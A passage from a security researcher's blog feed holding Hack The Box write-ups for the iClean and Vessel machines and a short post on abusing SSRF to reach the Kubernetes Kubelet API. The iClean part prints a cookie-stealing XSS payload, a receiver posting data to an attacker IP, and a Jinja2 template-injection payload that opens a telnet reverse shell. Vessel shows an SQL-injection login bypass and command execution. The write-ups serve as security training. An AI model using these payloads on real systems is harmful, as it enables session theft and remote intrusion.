username=admin&amp;password=admin</code></pre><p>From the &quot;Team&quot; page we can see the names of at least some of the cleaners.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.19.57.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1196" height="749" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.19.57.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.19.57.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.19.57.png 1196w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s see if we can get a different server response when trying to log in with any of these users:</p><p><a href="https://github.com/urbanadventurer/username-anarchy">https://github.com/urbanadventurer/username-anarchy</a></p><pre><code>~ username-anarchy mary pikes
~ username-anarchy mary pikes --suffix capiclean.htb
~ username-anarchy martha smith
~ username-anarchy martha smith --suffix capiclean.htb
~ username-anarchy jasmine summers
~ username-anarchy jasmine summers --suffix capiclean.htb
~ username-anarchy mike samuels
~ username-anarchy mike samuels --suffix capiclean.htb
</code></pre><p>All of the above return a generic error message, and there is no consistent time difference in the response.</p><p>Directory enumeration with <code>gobuster</code> didn&apos;t find much except a <code>dashboard</code> page, which likely requires authentication.</p><pre><code>~ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-big.txt

~ gobuster dir -u http://capiclean.htb/ -w directory-list-2.3-big.txt -s &quot;200,204,301,302,307,401,403,405,500&quot;

/about                (Status: 200) [Size: 5267]
/login                (Status: 200) [Size: 2106]
/services             (Status: 200) [Size: 8592]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/logout               (Status: 302) [Size: 189] [--&gt; /]
/dashboard            (Status: 302) [Size: 189] [--&gt; /]
/choose               (Status: 200) [Size: 6084]
/server-status        (Status: 403) [Size: 278]</code></pre><p>The <code>quote</code> page also sends a very simple request:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.09.48.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1262" height="790" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.09.48.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.09.48.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.09.48.png 1262w" sizes="(min-width: 720px) 720px"></figure><pre><code>POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded

service=Carpet+Cleaning&amp;service=Tile+%26+Grout&amp;service=Office+Cleaning&amp;email=test%40htb.com</code></pre><p>Testing these fields for XSS we get a hit on all the ports defined for the <code>service</code> parameter:</p><pre><code>POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded

service=&lt;img%20src=&apos;http://10.10.14.69:9001&apos;/&gt;&amp;service=&lt;img%20src=&apos;http://10.10.14.69:9002&apos;/&gt;&amp;service=&lt;img%20src=&apos;http://10.10.14.69:9003&apos;/&gt;&amp;email=&lt;img%20src=&apos;http://10.10.14.69:9004&apos;/&gt;</code></pre><hr><h2 id="from-xss-to-auth-bypass">From XSS to Auth Bypass</h2><p>Let&apos;s try to steal some cookies!</p><p>First, I&apos;ll setup a simple Flask API to receive POST requests from the injected JavaScript payload:</p><pre><code class="language-python">import json
from flask import Flask, request
from flask_cors import CORS
from urllib.parse import unquote
import base64

app = Flask(__name__)
CORS(app)

@app.route(&apos;/api/exfil&apos;, methods=[&apos;POST&apos;])
def exfil():
    print(&quot;[+] Received data &quot;)
    encoding = request.args.get(&apos;encoding&apos;)
    data = request.form.get(&apos;data&apos;)
    try:
        decoded_data = unquote(unquote(data))
        if encoding is not None and encoding == &apos;base64&apos;:
            print(base64.b64decode(decoded_data))
        else:
            print(decoded_data)
    except Exception as exception:
        print(f&apos;Something went wrong: {exception}&apos;)
        return json.dumps({&apos;success&apos;:False}), 500, {&apos;ContentType&apos;:&apos;application/json&apos;}
    return json.dumps({&apos;success&apos;:True}), 200, {&apos;ContentType&apos;:&apos;application/json&apos;}

app.run(host=&apos;0.0.0.0&apos;, port=9000)
</code></pre><p>Now, let&apos;s build our payload:</p><figure class="kg-card kg-code-card"><pre><code>(function () {
    const attackers_ip = &apos;10.10.14.69&apos;;
    const flask_api_port = &apos;9000&apos;;
    var exfil_data = function(data) {
        encoded_data = encodeURIComponent(data);
        fetch(
            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
            {
                method: &apos;POST&apos;,
                headers: { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; },
                body: &quot;data=&quot; + encoded_data
            }
        );
    }
    var attack = function() {
        try {
            exfil_data(btoa(document.cookie))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());</code></pre><figcaption>exfil_cookie.js</figcaption></figure><p>It seems like the JS file is being invoked but not executed ... </p><pre><code>Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.12 - - [02/Aug/2024 15:48:01] &quot;GET /exfil_cookie.js HTTP/1.1&quot; 200 -</code></pre><p>After some tweaking we get a working payload:</p><pre><code>POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 211

service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_cookie.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E

// Decoded: 
// &lt;img src=x onerror=&quot;var script1=document.createElement(&apos;script&apos;);script1.src=&apos;http://10.10.14.69:80/exfil_cookie.js&apos;;document.head.appendChild(script1);&quot;/&gt;</code></pre><p>We have a cookie!</p><pre><code>session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0</code></pre><hr><h2 id="from-auth-bypass-to-rce">From Auth Bypass to RCE</h2><p>With this cookie we can now access the <code>dashboard</code> page:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-16.08.11.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1212" height="683" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-16.08.11.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-16.08.11.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-16.08.11.png 1212w" sizes="(min-width: 1200px) 1200px"><figcaption>http://capiclean.htb/dashboard</figcaption></figure><p>We can generate a new invoice, which generates an ID:</p><pre><code>POST /InvoiceGenerator HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0

selected_service=Basic+Cleaning&amp;qty=1&amp;project=abc&amp;client=abc&amp;address=abc&amp;email-address=admin%40capiclean.htb</code></pre><p>The IDs are not sequential:</p><pre><code>2481856170 
7829583255
7193822935</code></pre><p>With these IDs we can generate a QR code:</p><pre><code>POST /QRGenerator HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0

form_type=invoice_id&amp;invoice_id=2481856170</code></pre><p>The response contains a URL that points to a QR code:</p><pre><code class="language-html">&lt;p&gt;QR Code Link: &lt;a href=&quot;http://capiclean.htb/static/qr_code/qr_code_2481856170.png&quot; target=&quot;_blank&quot;&gt;http://capiclean.htb/static/qr_code/qr_code_2481856170.png&lt;/a&gt;&lt;/p&gt;</code></pre><p>This link can then be used to generate a &quot;scannable invoice&quot;:</p><pre><code>POST /QRGenerator HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0

invoice_id=&amp;form_type=scannable_invoice&amp;qr_link=http%3A%2F%2Fcapiclean.htb%2Fstatic%2Fqr_code%2Fqr_code_2481856170.png</code></pre><p>It looks like when a valid image is found, its content is base64-encoded and embedded in the response:</p><pre><code class="language-html">&lt;div class=&quot;qr-code&quot;&gt;
&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAABiAQAAAACD3jujAAABTElEQVR4nL3UPaplMQgAYMFWcCuCreDWA2mFbCVgG3Ay583APXjrl+6DgPEvUB9nwC8IMOeAZRu8yXP52WhZXaKOkfMofhNFivJ3LZ+5ML/IM3YFz//xPgWozxHouolk6b33L79PHQkRS6rZZYE2tsSxLhJVDJpnd6GFuVUUd00Ihp0Gz6vf4kJKTdzepVurnGlBl1DKMruv78o5bQxWfrJ9i3yzLzHDLgGyIYfGE/2t2y8N9VSpLj3TaAoMb5oEY0ZkPRHeqrx3+WB6VzIzDphRXVO0DNP0p54v7RW4yHBL1y37AIzw+CI7lg5yRjUd2WORWK0uOTqB3Ry7AEeSxTD2Ltp35GrfVjfxFLtTOQG67ggQnRvjp2YvAbqMQ6bYdTcHh6U4edNdxCXCBPxN9LeRdw2+6WYUIWRdz88w6LB2Ac4Mp6NcTb/71/0BhwD5EVZWwGQAAAAASUVORK5CYII=&quot; alt=&quot;QR Code&quot;&gt;
&lt;/div&gt;</code></pre><p>Playing around with this field, we find that it&apos;s likely vulnerable to <code>SSTI</code>:</p><pre><code>POST /QRGenerator HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0
Upgrade-Insecure-Requests: 1

invoice_id=&amp;form_type=scannable_invoice&amp;qr_link={{7*7}}</code></pre><pre><code>&lt;div class=&quot;qr-code-container&quot;&gt;&lt;div class=&quot;qr-code&quot;&gt;&lt;img src=&quot;data:image/png;base64,49&quot; alt=&quot;QR Code&quot;&gt;&lt;/div&gt;
&lt;/body&gt;</code></pre><p>After some trial and error (and with a lot of help from <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">this</a> article), we get a working RCE:</p><pre><code>{%with a=request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&apos;\x5f\x5fgetitem\x5f\x5f&apos;)(&apos;\x5f\x5fimport\x5f\x5f&apos;)(&apos;os&apos;)|attr(&apos;popen&apos;)(&apos;telnet 10.10.14.69 4444 | /bin/sh | telnet 10.10.14.69 4445&apos;)|attr(&apos;read&apos;)()%}{%print(a)%}{%endwith%}</code></pre><p>Let&apos;s upgrade the <code>telnet</code> shell and enumerate:</p><pre><code>python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><pre><code>$ ls -la
-rw-r--r-- 1 root root 12553 Mar  2 07:29 app.py
drwxr-xr-x 6 root root  4096 Sep 27  2023 static
drwxr-xrwx 2 root root  4096 Aug  2 17:30 templates

$ cat app.py

[...]
db_config = {
    &quot;host&quot;: &quot;127.0.0.1&quot;,
    &quot;user&quot;: &quot;iclean&quot;,
    &quot;password&quot;: &quot;pxCsmnGLckUb&quot;,
    &quot;database&quot;: &quot;capiclean&quot;
}
[...]

$ mysql -u iclean -ppxCsmnGLckUb capiclean

&gt; select * from users;

| id | username | password | role_id |
+----+----------+----------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------+----------------------------------+
2 rows in set (0.00 sec)</code></pre><p>Let&apos;s crack <code>consuela</code>&apos;s hash:</p><pre><code>~ hashcat -a 0 -m 1400 consuela_hash.txt ../../../rockyou.txt --status --status-timer=10 -w 3 --show

0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean</code></pre><p>As expected, we can now SSH into the machine as <code>consuela</code>:</p><pre><code>~ ssh consuela@capiclean.htb
consuela@capiclean.htb&apos;s password: simple and clean

[...]
You have mail.
Last login: Fri Aug  2 14:10:18 2024 from 10.10.14.108

consuela@iclean:~$ cat user.txt
163c1a080901773d156dfa33fe4a4d3e</code></pre>]]></content:encoded></item><item><title><![CDATA[Exploiting SSRF in Kubernetes]]></title><description><![CDATA[<p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control</p>]]></description><link>inesmartins.github.io/exploiting-ssrf-in-k8s-environment/</link><guid isPermaLink="false">660ac0a92ac6400bb040b8bf</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 01 Apr 2024 17:30:11 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/04/6.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/04/6.png" alt="Exploiting SSRF in Kubernetes"><p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control of the URI, but, as expected, could not control the request headers. Also, there was no rate limit.</p><p>While writing my report I explained how this vulnerability could be abused to bypass security controls, enumerate internal hosts and services, and even perform DoS attacks on third parties or internal services.</p><p>However, I wanted to go one step further.</p><p>I knew the containerised application ran on a GKE cluster, so I wanted to see how much of the internal <code>k8s</code> configuration I could exfiltrate.</p><p>After coming across <a href="https://www.assetnote.io/resources/research/cloudflare-pages-part-3-the-return-of-the-secrets">this post</a> I found that the <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">Kubelet API</a> allows you to retrieve information about each pod running on the host by calling the following endpoint:</p><pre><code>http://&lt;host_ip&gt;:10255/pods</code></pre><p>As described in <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">the documentation</a>:</p><blockquote>The information is very detailed and includes the metadata, labels, annotations, owner references (for example the DaemonSet that owns the pod), volumes, containers, and status.</blockquote><p>The response was a gold mine.</p><p>Note that I was also able to trigger unauthorised requests that relate to metrics, but the results were not as relevant:</p><pre><code>http://&lt;host_ip&gt;:10255/metrics
http://&lt;host_ip&gt;:10255/metrics/cadvisor
http://&lt;host_ip&gt;:10255/metrics/probes</code></pre><p>Let me know if you come across other ways to exploit this vulnerability ;)</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Vessel (user-only)]]></title><description><![CDATA[Write-up for Vessel, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-write-up-vessel/</link><guid isPermaLink="false">62d2d982c75dc1453ef69638</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 12 Nov 2022 13:08:15 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.36.11.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.36.11.png" alt="HTB Write-up | Vessel (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/vessel">here</a>.</em></p><hr><p>As per usual, let&apos;s start by configuring <code>vessel.htb</code> as a virtual host:</p><pre><code>~ sudo nano /etc/hosts

...
# hackthebox
10.129.11.175    vessel.htb</code></pre><p>... and run a quick (<code>-F</code>) <code>nmap</code> scan:</p><pre><code>~ nmap -F vessel.htb -Pn

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</code></pre><p>Ok, let&apos;s dig a little deeper on ports <code>22</code> and <code>80</code>:</p><pre><code>~ nmap -sC -sV vessel.htb -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)
|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)
|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There&apos;s a web service running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/09/Screenshot-2022-09-11-at-20.37.54.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="2000" height="1004" srcset="inesmartins.github.io/content/images/size/w600/2022/09/Screenshot-2022-09-11-at-20.37.54.png 600w, inesmartins.github.io/content/images/size/w1000/2022/09/Screenshot-2022-09-11-at-20.37.54.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/09/Screenshot-2022-09-11-at-20.37.54.png 1600w, inesmartins.github.io/content/images/size/w2400/2022/09/Screenshot-2022-09-11-at-20.37.54.png 2400w" sizes="(min-width: 1200px) 1200px"></figure><p>Not much to see ... we can&apos;t even create an account:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/11/Screenshot-2022-09-11-at-20.38.40-1.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1994" height="911" srcset="inesmartins.github.io/content/images/size/w600/2022/11/Screenshot-2022-09-11-at-20.38.40-1.png 600w, inesmartins.github.io/content/images/size/w1000/2022/11/Screenshot-2022-09-11-at-20.38.40-1.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/11/Screenshot-2022-09-11-at-20.38.40-1.png 1600w, inesmartins.github.io/content/images/2022/11/Screenshot-2022-09-11-at-20.38.40-1.png 1994w" sizes="(min-width: 1200px) 1200px"></figure><p>However, <a href="https://github.com/OJ/gobuster"><a href="https://github.com/OJ/gobuster">gobuster</a></a> found an interesting directory:</p><pre><code>~ gobuster dir -u http://vessel.htb/ --exclude-length 26 -w big.txt
...
/dev                  (Status: 301) [Size: 173] [--&gt; /dev/]</code></pre><p><code>dev</code> contains a <code>.git</code> directory, which is a great place to start:</p><pre><code>~ gobuster dir -u http://vessel.htb/dev/ --exclude-length 26 common.txt

...
/.git/HEAD            (Status: 200) [Size: 23]
/.git/config          (Status: 200) [Size: 139]
/.git/index           (Status: 200) [Size: 2607]</code></pre><p>Let&apos;s use <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to dump everything:</p><pre><code>~ pip install git-dumper
~ git-dumper http://vessel.htb/dev/.git/ git-output
~ cd git-output
~ ls -la
total 8
drwxr-xr-x   8 inesmartins  staff  256 Aug 28 12:58 .
drwxr-xr-x   5 inesmartins  staff  160 Aug 28 12:58 ..
drwxr-xr-x  13 inesmartins  staff  416 Aug 28 12:59 .git
drwxr-xr-x   3 inesmartins  staff   96 Aug 28 12:58 config
-rw-r--r--   1 inesmartins  staff  788 Aug 28 12:58 index.js
drwxr-xr-x   5 inesmartins  staff  160 Aug 28 12:58 public
drwxr-xr-x   3 inesmartins  staff   96 Aug 28 12:58 routes
drwxr-xr-x   9 inesmartins  staff  288 Aug 28 12:58 views</code></pre><p>The <code>config</code> dir has some database credentials but we have nowhere to use them:</p><pre><code>~ cat config/db.js
var mysql = require(&apos;mysql&apos;);

var connection = {
        db: {
        host     : &apos;localhost&apos;,
        user     : &apos;default&apos;,
        password : &apos;daqvACHKvRn84VdVp&apos;,
        database : &apos;vessel&apos;
}};

module.exports = connection;%</code></pre><p>We can use <a href="https://www.gitkraken.com/">GitKraken</a> to better understand the history of this project:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.14.27.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="432" height="140"></figure><p>In the &quot;Security fixes&quot; commit, &quot;Ethan&quot; changed the way that the login was done by parameterising the login query:</p><figure class="kg-card kg-image-card kg-width-full"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.12.01.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1561" height="415" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-28-at-13.12.01.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-28-at-13.12.01.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.12.01.png 1561w"></figure><p>On the last commit (&quot;Potential security fixes&quot;), they simply added a comment about &quot;Upgrading deprecated mysqljs&quot;, but they didn&apos;t make any other changes, which lets us know that this version of <code>mysqljs</code> is likely vulnerable:</p><figure class="kg-card kg-image-card kg-width-full"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.11.23.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1304" height="314" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-28-at-13.11.23.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-28-at-13.11.23.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.11.23.png 1304w"></figure><p>It does seem like <code>mysqljs</code> is potentially vulnerable to SQL Injection:</p><blockquote>Keys of objects in <code>mysql</code> node module <code>v2.0.0-alpha7</code> and earlier are not escaped with <code>mysql.escape()</code> which could lead to SQL Injection.<br>[<a href="https://www.cvedetails.com/cve/CVE-2015-9244/">CVE-2015-9244</a>]</blockquote><p>Thanks to <a href="https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/">this</a> article, I found a working payload pretty quickly:</p><pre><code>POST /api/login HTTP/1.1
Host: vessel.htb
...

username=admin&amp;password[password]=1
</code></pre><p>We&apos;re in!</p><hr><h2 id="exploring-the-dashboard">Exploring the Dashboard</h2><p>This entire website looks like it just contains charts and tables with mock data:</p><figure class="kg-card kg-image-card kg-width-full kg-card-hascaption"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.38.23.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="2000" height="791" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-28-at-13.38.23.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-28-at-13.38.23.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/08/Screenshot-2022-08-28-at-13.38.23.png 1600w, inesmartins.github.io/content/images/size/w2400/2022/08/Screenshot-2022-08-28-at-13.38.23.png 2400w"><figcaption>E</figcaption></figure><p>There&apos;s really not much else to explore, but when we click the &quot;Analytics&quot; tab, we can see a link to a new virtual host: <a href="http://openwebanalytics.vessel.htb/">http://openwebanalytics.vessel.htb</a>, so let&apos;s map it out:</p><pre><code>~ sudo nano /etc/host

...
10.129.11.175   vessel.htb
10.129.11.175   openwebanalytics.vessel.htb</code></pre><hr><h2 id="open-web-analytics">Open Web Analytics</h2><blockquote><a href="https://www.openwebanalytics.com/">Open Web Analytics</a> is the free and open source web analytics framework that lets you stay in control of how you instrument and analyze the use of your websites and application.</blockquote><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.41.41.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1209" height="746" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-28-at-13.41.41.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-28-at-13.41.41.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-13.41.41.png 1209w" sizes="(min-width: 1200px) 1200px"></figure><p>From the source code it looks like it&apos;s running version <code>1.7.3</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-15.26.44-2.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1152" height="247" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-28-at-15.26.44-2.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-28-at-15.26.44-2.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-28-at-15.26.44-2.png 1152w"></figure><p>After testing out the password reset flow we know that <code>admin@vessel.htb</code> exists on this system, so we can assume that <code>admin</code> is a valid username, but unfortunately the only password we know - <code>daqvACHKvRn84VdVp</code> - does not work.</p><p>Open Web Analytics has a pretty interesting CVE:</p><blockquote>Open Web Analytics (OWA) before <code>1.7.4</code> allows an unauthenticated remote attacker to obtain sensitive user information, which can be used to gain admin privileges by leveraging cache hashes.<br>This occurs because files generated with <code>&apos;&lt;?php</code> (instead of the intended <code>&quot;&lt;?php</code> sequence) aren&apos;t handled by the PHP interpreter. <br>[<a href="https://github.com/advisories/GHSA-pr9q-v585-qv2w">CVE-2022-24637</a>]</blockquote><p><a href="https://devel0pment.de/?p=2494">This</a> article does a great job at explaining how to exploit it, but it does obscure some information, so it took some trial and error until I was finally able to reset the user&apos;s password and login as <code>admin</code>.</p><p>The same article then goes on to describe a vulnerability that allows an Administrator to get <code>RCE</code> via log poisoning.</p><p>My final exploit is shown below:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/bfde26f838934cce70b2dc1a883f9056.js"></script><!--kg-card-end: html--><hr><h2 id="exploring-the-machine">Exploring the machine</h2><p>Using this script, we&apos;re able to execute commands directly on the machine:</p><pre><code>~ python3 owa.py --cmd=&quot;whoami&quot;
www-data</code></pre><p>Let&apos;s try to dump the <code>mysql</code> database, since we have the admin creds:</p><pre><code>~ python3 owa.py --cmd=&quot;which mysqldump&quot;
/usr/bin/mysqldump

~ python3 owa.py --cmd=&quot;/usr/bin/mysqldump -u default -pdaqvACHKvRn84VdVp vessel&quot;
...
LOCK TABLES `accounts` WRITE;
/*!40000 ALTER TABLE `accounts` DISABLE KEYS */;
INSERT INTO `accounts` VALUES (1,&apos;admin&apos;,&apos;k&gt;N4Hf6TmHE(W]Uq\&quot;(RCj}V&gt;&amp;=rB$4}&lt;&apos;,&apos;admin@vessel.htb&apos;);
...</code></pre><p>We have a possible password for the vessel web application, but this is likely useless.</p><p>Let&apos;s see what else is there:</p><pre><code>~ python3 owa.py --cmd=&quot;ls -la /home&quot;

total 16
drwxr-xr-x  4 root   root   4096 Aug 11 14:43 .
drwxr-xr-x 19 root   root   4096 Aug 11 14:43 ..
drwx------  5 ethan  ethan  4096 Aug 11 14:43 ethan
drwxrwxr-x  3 steven steven 4096 Aug 11 14:43 steven

~ python3 owa.py --cmd=&quot;ls -la /home/ethan&quot;

~ ls -la /home/steven
total 33796
drwxrwxr-x 3 steven steven     4096 Aug 11 14:43 .
drwxr-xr-x 4 root   root       4096 Aug 11 14:43 ..
lrwxrwxrwx 1 root   root          9 Apr 18 14:45 .bash_history -&gt; /dev/null
-rw------- 1 steven steven      220 Apr 17 18:38 .bash_logout
-rw------- 1 steven steven     3771 Apr 17 18:38 .bashrc
drwxr-xr-x 2 ethan  steven     4096 Aug 11 14:43 .notes
-rw------- 1 steven steven      807 Apr 17 18:38 .profile
-rw-r--r-- 1 ethan  steven 34578147 May  4 11:03 passwordGenerator

~ python3 owa.py --cmd=&quot;ls -la /home/steven/.notes&quot;

total 40
drwxr-xr-x 2 ethan  steven  4096 Aug 11 14:43 .
drwxrwxr-x 3 steven steven  4096 Aug 11 14:43 ..
-rw-r--r-- 1 ethan  steven 17567 Aug 10 18:42 notes.pdf
-rw-r--r-- 1 ethan  steven 11864 May  2 21:36 screenshot.png</code></pre><p>We have some interesting files!</p><p>The <code>.pdf</code> file is password-protected:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-12.48.08.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1117" height="677" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-30-at-12.48.08.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-30-at-12.48.08.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-12.48.08.png 1117w"></figure><p>The screenshot seems to show the interface of the <code>passwordGenerator</code> file that we had found previously on <code>steven</code>&apos;s home directory:</p><figure class="kg-card kg-image-card"><img 